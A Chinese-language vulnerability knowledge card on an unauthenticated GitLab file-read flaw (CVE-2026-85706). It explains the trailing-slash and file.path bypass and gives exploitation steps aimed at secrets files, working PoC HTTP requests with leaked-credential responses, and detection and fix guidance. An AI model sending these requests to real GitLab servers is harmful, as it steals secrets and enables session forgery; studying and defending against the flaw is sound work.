---
id: web-generic-file-inclusion-gitlab-commits-api-file-path-unauth-read
title: GitLab Repository Commits API 未授权任意文件读取（CVE-2026-85706）：尾斜杠绕过 workhorse 路由并信任 file.path
type: scenario
domain: web
path: web/generic/file-inclusion
technique: gitlab-commits-api-unauth-file-read
tags:
- gitlab
- file-read
- arbitrary-file-read
- path-traversal
- auth-bypass
- workhorse
- grape
- cve-2026-85706
cve:
- CVE-2026-85706
severity: critical
confidence: high
affected_versions: GitLab CE/EE >=18.7 且 <19.1.8；>=19.2 且 <19.2.6；>=19.3 且 <19.3.2（修复 19.1.8/19.2.6/19.3.2）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V25
  verified_at: '2026-11-05T02:54:24+08:00'
  notes: 已对照原文与 3 张截图核对：尾斜杠绕过 workhorse \z 路由、空 file= 绕过 WorkhorseFile、file.path 直读 File.read、Content-Type=application/x-www-form-urlencoded 触发 parse_nested_query 回显、公开项目+未认证前提、CVE-2026-85706 与受影响/修复版本区间、PoC 请求与图03 回显的 database_password/secret_key_base/裸%测试串一致。未验证点：未能独立复现真实 GitLab 实例，回显前缀与 mock/真实实例差异（'400 Bad request -'）已在卡内说明；CVE 编号与上游公告未联网复核。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-gitlab-commits-api-file-path-unauth-read/
draft: false
kb_aliases:
- CVE-2026-85706
- GitLab 未授权任意文件读取
- repository/commits 尾斜杠绕过
- workhorse 路由绕过
- file.path 任意文件读取
- GitLab secrets.json 读取
---

## 一句话结论

GitLab CE/EE 的 `POST /api/v4/projects/:id/repository/commits` 在路径末尾加斜杠即可绕过 gitlab-workhorse 的上传器路由（正则用 `\z` 锚定），再用空值 `file=` 绕过 Grape 的 `WorkhorseFile` 校验，后端 `file_params_from_body_upload` 直接信任请求参数 `file.path` 并 `File.read`，从而让未认证攻击者读取任意服务器文件；当请求体参数 `Content-Type=application/x-www-form-urlencoded` 时，文件内容被 `parse_nested_query` 解析，非法 `%` 触发的异常会把内容带进 HTTP 400 响应，形成报错回显式逐字泄露。

## 原理

- **第一层：workhorse 路由不匹配**。gitlab-workhorse 为 `POST .../repository/commits` 注册了请求体上传器，路由正则形如 `^/api/v4/projects/[^/]+/repository/commits\z`。`\z` 要求字符串在此结束，路径末尾多一个 `/` 后正则不命中，workhorse 改走 plain-proxy 原样转发；但代理仍会注入合法的 workhorse 认证头。
- **第二层：Grape 仍能路由到端点**。Rails/Grape 对 `/repository/commits/` 仍匹配 `post ':id/repository/commits'`，所以请求到达脆弱处理逻辑。
- **第三层：空 file 绕过类型校验**。端点声明 `requires :file, type: ::API::Validations::Types::WorkhorseFile`；传空值 `file=` 时该参数为 nil，校验通过（真实上传文件才需要 workhorse 签名）。
- **第四层：路径信任**。`file_params_from_body_upload` 读取的是原始请求参数 `params['file.path']`，而不是 workhorse 签名后落盘到受控临时目录的 `UploadedFile` 元数据；`File.exist?` 通过后直接 `Rack::Utils.parse_nested_query(File.read(file_path))`，没有任何目录收敛。
- **第五层：认证缺失**。处理体在文件读取前只调用 `require_gitlab_workhorse!`（仅确认请求来自 workhorse），没有 `authenticate!`；声明式 `route_setting :authorization` 又因尾斜杠导致的 route 匹配差异未生效。配合公开项目，未认证用户即可触发。
- **报错回显**：请求体里带 `Content-Type=application/x-www-form-urlencoded` 会决定 helper 用 `parse_nested_query` 解析文件内容；若文件含裸 `%`（非法百分号编码），解析抛 `InvalidParameterError`，异常消息包含原始内容，`bad_request!("Invalid parameter: #{e.message}")` 将其写回 400 响应。文件不含非法 `%` 时只能盲读（用 `local file not present` 判断存在性，读取成功可能返回 500）。

## 触发条件

- GitLab CE/EE 受影响版本（18.7–19.1.7、19.2–19.2.5、19.3–19.3.1）。
- 存在一个公开（Public）项目，攻击者知道其 project ID；私有项目匿名访问会被 401 拒绝。
- 请求路径必须以 `/repository/commits/` 结尾（带尾斜杠），并使用 `Content-Type: application/x-www-form-urlencoded`。
- 目标文件对 GitLab 进程用户可读；要拿到逐字回显，文件内容需含非法 `%`。
- 反向代理/WAF 未拦截该端点或未强制认证。

## 利用步骤

1. 找到一个公开项目 ID（默认可从 `/api/v4/projects` 或页面获取，示例 ID=1）。
2. 先做存在性探针：`file=` 传空，`file.path` 传不存在的路径，观察是否返回 `local file not present`，确认端点可达且版本脆弱。
3. 把 `file.path` 换成目标文件绝对路径，并在请求体加入 `Content-Type=application/x-www-form-urlencoded`。
4. 若文件含非法 `%`，400 响应的 `Invalid parameter: invalid %-encoding (<内容>)` 会回显文件内容；若不含，则读取成功但无内容回显（盲读）。
5. 优先读取 `/etc/gitlab/gitlab-secrets.json`、`/var/opt/gitlab/gitlab-rails/etc/database.yml`、应用源码/配置；拿到 `secret_key_base`、`db_key_base`、`otp_key_base` 后可进一步伪造会话/扩大影响。
6. 用逐字/分段读取策略处理长文件（每次让解析错误停在可回显的位置，或选择含 `%` 的文件片段）。

## PoC

存在性探针：

```http
POST /api/v4/projects/1/repository/commits/ HTTP/1.1
Host: target:8881
Content-Type: application/x-www-form-urlencoded

file=&file.path=%2Fnonexistent%2Fprobe&file.size=1&Content-Type=application%2Fx-www-form-urlencoded
```

响应：

```json
{"message":"local file not present"}
```

读取含非法 `%` 的文件（回显内容）：

```http
POST /api/v4/projects/1/repository/commits/ HTTP/1.1
Host: target:8881
Content-Type: application/x-www-form-urlencoded

file=&file.path=/tmp/vuln-leak-test.yml&file.size=1&Content-Type=application%2Fx-www-form-urlencoded
```

响应：

```json
{"message":"400 Bad request - Invalid parameter: invalid %-encoding (gitlab:\n database_password: \"REAL-DB-PASSWORD-2026\"\n secret_key_base: \"REAL-SECRET-KEY-BASE-2026\"\n ...)"}
```

读取 `/etc/gitlab/gitlab-secrets.json` 时若文件不含裸 `%`，实例返回 500（文件已被读取但无法经异常回显），只能确认读取成功，需结合其他含 `%` 的文件或盲读判断。

## 变体与关联

- 变体：把 `Content-Type` 参数换成其他触发解析错误的类型，或在文件内容中寻找非法 `%` 片段；报错回显的根因是“异常消息拼接原始内容”，同类错误处理缺陷可用于其他解析器。
- 变体：若目标文件不含 `%`，可先读取含 `%` 的 YAML/配置/日志片段，或结合其他可写文件构造解析错误。
- 变体：尾斜杠绕过依赖 `\z` 锚点；其他 workhorse 上传路由若使用 `\z` 或精确匹配，也可能因路径规范化差异被绕过。
- 关联卡片：[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（路径过滤与解码错位）、[[web-generic-file-inclusion-python-os-path-join-absolute-traversal]]（路径信任类文件读取）。
- 边界：私有项目匿名请求 401；WAF 统一去除尾斜杠或强制认证后失效；修复版本改为使用签名 `UploadedFile` 元数据并补 `authenticate!`，同时不再回显解析内容。

## 检测与防御

- 检测特征：未认证 `POST /api/v4/projects/*/repository/commits/`（尾斜杠）；请求体含 `file=&file.path=`、`file.size=`、`Content-Type=application/x-www-form-urlencoded`；响应出现 `local file not present`、`invalid %-encoding`、`Invalid parameter:`；对 commits 端点的 500/400 异常比例升高。
- 日志/流量：`file.path` 指向 `/etc/gitlab/`、`database.yml`、`/tmp/`、源码目录等非上传目录；同一 IP 对同一端点反复探测不同路径。
- 修复：升级到 19.1.8 / 19.2.6 / 19.3.2；文件读取改用 workhorse 签名并落盘的 `UploadedFile` 元数据（`uploaded_file.path`），限制在允许目录；在 `file_params_from_body_upload` 前补 `authenticate!`；解析错误不回显原始内容。
- 加固：反向代理对 `/repository/commits` 统一去除/拒绝尾斜杠并强制认证；WAF 阻断含 `file.path` 的未认证请求；轮换可能泄露的 `secret_key_base` 等密钥。
